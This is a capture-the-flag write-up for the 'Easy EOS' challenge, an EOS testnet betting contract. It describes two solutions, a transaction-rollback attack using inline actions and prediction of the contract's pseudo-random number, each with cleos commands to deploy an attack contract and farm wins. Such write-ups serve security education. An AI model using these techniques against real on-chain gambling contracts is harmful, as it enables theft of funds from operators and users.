[中文](./README_zh.md) [English](./README.md)
>  Congratulations to Whitzard、$wagger、NoSugar、AAA for winning the game.

## Problem

Title: Easy EOS

Author: Gaia

Description:

```shell
Try to win this game.
account: de1ctf111eos
EOS Jungle2.0 Testnet
You need to win at least 10 times.
You can ask for a flag with the sendmail function. (username: your account, address: your email address)

hint for [Easy EOS]: the num of bet action is in range 0-4. Decompilation is optional.
hint for [Easy EOS]: if you lost，you can't bet anymore with this account.
```



## Answer

### Answer one ：*Roll Back* Attack

After observing, we found that the bet action completed the guessing number game in one transaction. If it wins, the number of wins in the users table plus 1; if lost, the number of lost in the users table plus 1.

By deploying contracts, we can use the "inline action" method to make guess numbers and judgments. The first action is to guess the number, and the second action is to judge whether we win or not. If we win, pass; if we lose, throw an exception and roll back the entire transaction.

The way to attack

```shell
# set permissions
cleos set account permission gllrgjlqclkp active '{"threshold": 1,"keys": [{"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1}],"accounts":[{"permission":{"actor":"gllrgjlqclkp","permission":"eosio.code"},"weight":1}]}' owner -p gllrgjlqclkp@owner
# Compile contract
cd attack4
eosio-cpp -o attack4.wasm attack4.cpp
# Deploy contract
cleos set contract gllrgjlqclkp . -p gllrgjlqclkp@active
# Call the makebet method multiple times until the number of account wins is greater than or equal to 10
cleos push action gllrgjlqclkp makebet '[]' -p gllrgjlqclkp@active
# Ask for a flag
cleos push action de1ctftest11 sendmail '["gllrgjlqclkp", "xxxx@qq.com"]' -p gllrgjlqclkp@active
```

### Answer two ：Pseudo random number

Decompile the contract, get the algorithm that generates the pseudo-random number, deploy the corresponding contract. In a transaction, calculate the random number to be generated, and then use the random number to call the bet action of the target contract.

The way to attack

```shell
# set permissions
cleos set account permission btdaciaibmfp active '{"threshold": 1,"keys": [{"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1}],"accounts":[{"permission":{"actor":"btdaciaibmfp","permission":"eosio.code"},"weight":1}]}' owner -p btdaciaibmfp@owner
# Compile contract
cd attack
eosio-cpp -o attack.wasm attack.cpp
# Deploy contract
cleos set contract btdaciaibmfp . -p btdaciaibmfp@active
# Call makebet method 10 times
cleos push action btdaciaibmfp makebet '[]' -p btdaciaibmfp@active
# Ask for a flag
cleos push action de1ctftest11 sendmail '["btdaciaibmfp", "xxxxxx@gmail.com"]' -p btdaciaibmfp@active
```





